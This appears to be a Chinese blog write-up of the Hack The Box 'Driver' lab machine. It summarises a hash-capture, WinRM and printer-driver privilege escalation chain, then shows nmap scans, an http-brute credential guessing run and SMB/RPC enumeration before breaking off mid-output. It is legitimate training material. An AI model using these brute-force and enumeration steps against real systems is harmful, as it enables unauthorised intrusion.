<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB-Driver | icon'Blog</title><meta name="author" content="icon"><meta name="copyright" content="icon"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTB-Driver:机器简介：Driver 是一台简单的 Windows 机器，专注于打印机开发。对机器的枚举显示，Web 服务器正在监听端口 80，同时 SMB 正在监听端口 445，WinRM 正在监听端口 5985。导航到该网站显示，它使用基本 HTTP 身份验证受到保护。在尝试常用凭据时，admin:admin 凭据被接受，因此我们能够访问该网页。该网页提供了一项功能，可以将打印机固件上">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB-Driver">
<meta property="og:url" content="https://iconabc.github.io/posts/23837ad8.html">
<meta property="og:site_name" content="icon&#39;Blog">
<meta property="og:description" content="HTB-Driver:机器简介：Driver 是一台简单的 Windows 机器，专注于打印机开发。对机器的枚举显示，Web 服务器正在监听端口 80，同时 SMB 正在监听端口 445，WinRM 正在监听端口 5985。导航到该网站显示，它使用基本 HTTP 身份验证受到保护。在尝试常用凭据时，admin:admin 凭据被接受，因此我们能够访问该网页。该网页提供了一项功能，可以将打印机固件上">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://iconabc.github.io/img/mbc.jpg">
<meta property="article:published_time" content="2024-11-22T15:52:37.000Z">
<meta property="article:modified_time" content="2024-12-02T10:45:01.682Z">
<meta property="article:author" content="icon">
<meta property="article:tag" content="内网">
<meta property="article:tag" content="靶场">
<meta property="article:tag" content="HTB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://iconabc.github.io/img/mbc.jpg"><link rel="shortcut icon" href="/img/shasha.png"><link rel="canonical" href="https://iconabc.github.io/posts/23837ad8.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":150,"languages":{"author":"作者: icon","link":"链接: ","source":"来源: icon'Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HTB-Driver',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/mbc.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/shuai.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">icon'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">HTB-Driver</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HTB-Driver</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-22T15:52:37.000Z" title="发表于 2024-11-22 23:52:37">2024-11-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-02T10:45:01.682Z" title="更新于 2024-12-02 18:45:01">2024-12-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HTB-Driver/">HTB-Driver</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">8.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>39分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="HTB-Driver"><a href="#HTB-Driver" class="headerlink" title="HTB-Driver:"></a>HTB-Driver:</h1><h2 id="机器简介："><a href="#机器简介：" class="headerlink" title="机器简介："></a>机器简介：</h2><p>Driver 是一台简单的 Windows 机器，专注于打印机开发。对机器的枚举显示，Web 服务器正在监听端口 80，同时 SMB 正在监听端口 445，WinRM 正在监听端口 5985。导航到该网站显示，它使用基本 HTTP 身份验证受到保护。在尝试常用凭据时，<code>admin:admin</code> 凭据被接受，因此我们能够访问该网页。该网页提供了一项功能，可以将打印机固件上传到 SMB 共享上，以供远程团队进行测试和验证。上传包含从本地机器获取远程文件的命令的 Shell 命令文件会导致用户 <code>tony</code> 的 NTLM 哈希被转发回给我们。破解捕获的哈希以检索纯文本密码，我们能够使用 WinRM 以 <code>tony</code> 身份登录。然后，切换到 meterpreter 会话，发现该机器容易受到本地特权攻击，该攻击会滥用远程机器上存在的特定打印机驱动程序。利用该漏洞，我们可以获得“NT AUTHORITY\SYSTEM”身份的会话。</p>
<h2 id="渗透过程："><a href="#渗透过程：" class="headerlink" title="渗透过程："></a>渗透过程：</h2><h3 id="初始侦察："><a href="#初始侦察：" class="headerlink" title="初始侦察："></a>初始侦察：</h3><h4 id="nmap端口扫描"><a href="#nmap端口扫描" class="headerlink" title="nmap端口扫描"></a>nmap端口扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -sT --min-rate 10000 -p- 10.129.40.36 -oA nmapscan/ports </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 07:49 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> loaclhost (10.129.40.36)</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 65531 filtered tcp ports (no-response)</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">80/tcp open http</span><br><span class="line">135/tcp open msrpc</span><br><span class="line">445/tcp open microsoft-ds</span><br><span class="line">5985/tcp open wsman</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 33.78 seconds</span><br></pre></td></tr></table></figure>

<h4 id="nmap详细信息扫描"><a href="#nmap详细信息扫描" class="headerlink" title="nmap详细信息扫描"></a>nmap详细信息扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -sT -sV -sC -O -p80,135,445,5985 10.129.40.36 -oA</span><br><span class="line">nmapscan/detail</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 07:59 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> loaclhost (10.129.40.36)</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">80/tcp open http Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Site doesn\&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">| http-methods: </span><br><span class="line">|_ Potentially risky methods: TRACE</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_ Basic realm=MFP Firmware Update Center. Please enter password <span class="keyword">for</span> admin</span><br><span class="line">135/tcp open msrpc Microsoft Windows RPC</span><br><span class="line">445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup:</span><br><span class="line">WORKGROUP)</span><br><span class="line">5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1</span><br><span class="line">open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|phone</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2008|Phone (87%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8</span><br><span class="line">cpe:/o:microsoft:windows</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2008 R2 (87%), Microsoft</span><br><span class="line">Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode: </span><br><span class="line">| account_used: guest</span><br><span class="line">| authentication_level: user</span><br><span class="line">| challenge_response: supported</span><br><span class="line">|_ message_signing: disabled (dangerous, but default)</span><br><span class="line">|_clock-skew: mean: 1h16m36s, deviation: 0s, median: 1h16m35s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">| 3:1:1: </span><br><span class="line">|_ Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">| <span class="built_in">date</span>: 2024-05-13T13:16:07</span><br><span class="line">|_ start_date: 2024-05-13T13:00:10</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at</span><br><span class="line">https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 54.97 seconds</span><br></pre></td></tr></table></figure>

<p>开放了四个端⼝，有信息的语句是“<strong>Basic realm&#x3D;MFP Firmware Update Center. Please enter password for admin</strong>”，其中也提到了⽤户名admin。</p>
<h4 id="nmap-udp扫描"><a href="#nmap-udp扫描" class="headerlink" title="nmap udp扫描"></a>nmap udp扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -sU --top-ports 20 10.129.40.36 -oA nmapscan/udp </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 08:46 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> driver.htb (10.129.40.36)</span><br><span class="line">Host is up (0.091s latency).</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">53/udp open|filtered domain</span><br><span class="line">67/udp open|filtered dhcps</span><br><span class="line">68/udp open|filtered dhcpc</span><br><span class="line">69/udp open|filtered tftp</span><br><span class="line">123/udp open|filtered ntp</span><br><span class="line">135/udp open|filtered msrpc</span><br><span class="line">137/udp open|filtered netbios-ns</span><br><span class="line">138/udp open|filtered netbios-dgm</span><br><span class="line">139/udp open|filtered netbios-ssn</span><br><span class="line">161/udp open|filtered snmp</span><br><span class="line">162/udp open|filtered snmptrap</span><br><span class="line">445/udp open|filtered microsoft-ds</span><br><span class="line">500/udp open|filtered isakmp</span><br><span class="line">514/udp open|filtered syslog</span><br><span class="line">520/udp open|filtered route</span><br><span class="line">631/udp open|filtered ipp</span><br><span class="line">1434/udp open|filtered ms-sql-m</span><br><span class="line">1900/udp open|filtered upnp</span><br><span class="line">4500/udp open|filtered nat-t-ike</span><br><span class="line">49152/udp open|filtered unknown</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 3.13 seconds</span><br></pre></td></tr></table></figure>

<p>并没有明确开放状态，后续按需求进行深入扫描，可与其他扫描同步启动，节约时间</p>
<h4 id="nmap漏洞脚本扫描"><a href="#nmap漏洞脚本扫描" class="headerlink" title="nmap漏洞脚本扫描"></a>nmap漏洞脚本扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap --script=vuln -p80,135,445,5985 10.129.40.36 -oA nmapscan/vuln</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 07:59 EDT</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">| Discovered hosts:</span><br><span class="line">| 224.0.0.251</span><br><span class="line">| After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_ Hosts are all up (not vulnerable).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> loaclhost (10.129.40.36)</span><br><span class="line">Host is up (0.081s latency).</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">80/tcp open http</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">135/tcp open msrpc</span></span><br><span class="line"><span class="string">445/tcp open microsoft-ds</span></span><br><span class="line"><span class="string">5985/tcp open wsman</span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_samba-vuln-cve-2012-1182: No accounts left to try</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-054: false</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 488.23 seconds</span></span><br></pre></td></tr></table></figure>

<p>这里扫描会有一些慢，耐心等待，没有新的有价值的信息</p>
<h4 id="web80端口渗透"><a href="#web80端口渗透" class="headerlink" title="web80端口渗透"></a>web80端口渗透</h4><p>打开web 80端口页面，显示登录认证，nmap扫描结果中提示了用户名是admin，自然想到了弱密码admin：</p>
<p>使用<code>admin:admin</code>成功登录</p>
<img src="/posts/23837ad8/1732291409911.png" class="" width="1732291409911">

<p>这里也可以自己使用burp抓包进行爆破操作。</p>
<p>这里也可以使用nmap自带脚本进行爆破操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p80 --script=http-brute driver.htb</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 12:43 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> driver.htb (10.129.40.36)</span><br><span class="line">Host is up (0.14s latency).</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">80/tcp open http</span><br><span class="line">| http-brute: </span><br><span class="line">| Accounts: </span><br><span class="line">| admin:admin - Valid credentials</span><br><span class="line">|_ Statistics: Performed 42132 guesses <span class="keyword">in</span> 600 seconds, average tps: 70.0</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 600.43 seconds</span><br></pre></td></tr></table></figure>

<p>登录进后台后，页面显示是MFP固件更新中心，提示“我们作为卓越中心的一部分，对多功能打印机进行各种测试，包括固件更新，驱动程序等。”最下方信息泄露了一个域名。那么我们可以修改hosts文件。</p>
<img src="/posts/23837ad8/1732291681462.png" class="" width="1732291681462">

<p>执行如下语句，添加hosts记录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> bash -c <span class="string">&#x27;echo &quot;10.129.40.36 driver.htb&quot; &gt;&gt; /etc/hosts&#x27;</span></span><br></pre></td></tr></table></figure>

<p>确认一手：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">tail</span> -n 1 /etc/hosts </span><br><span class="line">10.129.40.36 driver.htb</span><br></pre></td></tr></table></figure>

<p>渗透测试的时候，获得的域名不是必须本地解析，如果站点默认的内容和绑定域名的内容是⼀样的，hosts是否解析就完全⼀样了。</p>
<p>经过测试发现能够上传固件进行测试：</p>
<img src="/posts/23837ad8/1732291828380.png" class="" width="1732291828380">

<p>⻚⾯说：”<strong>选择打印机型号并上传相应的固件更新到我们的⽂件共享。我们的测试团队将⼿动审核这些上传内容，并很快启动测试。</strong>“</p>
<p>你能想到什么？它说传到⽂件共享，<code>445端⼝</code>是开放的，值得去看看。<code>技术栈是php</code>，可以上传&#96;php</p>
<p>反弹shell&#96;看能否执⾏，但⼀般smb不会是web⽬录，其实可以不尝试。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ nxc smb driver.htb --shares -u redteamnotes -p <span class="string">&#x27;&#x27;</span></span><br><span class="line">SMB 10.129.40.36 445 DRIVER [*] Windows 10 Enterprise</span><br><span class="line">10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 10.129.40.36 445 DRIVER [-] DRIVER\redteamnotes:</span><br><span class="line">STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>

<p>应该也是连接不上的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ smbclient -L 10.129.40.36 -N</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\kali]:</span><br><span class="line">session setup failed: NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>

<p>135端⼝也是开放的，可以获得⼀些信息吗？</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">└─$ rpcclient -U <span class="string">&quot;&quot;</span> -N 10.129.40.36</span><br><span class="line">Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>

<p>⽆法连接，⼀般也可以⽤<code>enum4linux</code>枚举⼀下，建议使⽤这个⼯具的最新版，即<code>enum4linux-ng</code>，可以在kali中直接安装， <code>sudo apt install enum4linux-ng</code> 即可.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/aptlabs]</span><br><span class="line">└─$ enum4linux-ng driver.htb</span><br><span class="line">ENUM4LINUX - next generation (v1.3.3)</span><br><span class="line">==========================</span><br><span class="line">| Target Information |</span><br><span class="line">==========================</span><br><span class="line">[*] Target ........... driver.htb</span><br><span class="line">[*] Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">[*] Random Username .. <span class="string">&#x27;mvwarusw&#x27;</span></span><br><span class="line">[*] Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">[*] Timeout .......... 5 second(s)</span><br><span class="line">===================================</span><br><span class="line">| Listener Scan on driver.htb |</span><br><span class="line">===================================</span><br><span class="line">[*] Checking LDAP</span><br><span class="line">[-] Could not connect to LDAP on 389/tcp: timed out</span><br><span class="line">[*] Checking LDAPS</span><br><span class="line">[-] Could not connect to LDAPS on 636/tcp: timed out</span><br><span class="line">[*] Checking SMB</span><br><span class="line">[+] SMB is accessible on 445/tcp</span><br><span class="line">[*] Checking SMB over NetBIOS</span><br><span class="line">[-] Could not connect to SMB over NetBIOS on 139/tcp: timed out</span><br><span class="line">=========================================================</span><br><span class="line">| NetBIOS Names and Workgroup/Domain <span class="keyword">for</span> driver.htb |</span><br><span class="line">=========================================================</span><br><span class="line">[-] Could not get NetBIOS names information via <span class="string">&#x27;nmblookup&#x27;</span>: timed out</span><br><span class="line">=======================================</span><br><span class="line">| SMB Dialect Check on driver.htb |</span><br><span class="line">=======================================</span><br><span class="line">[*] Trying on 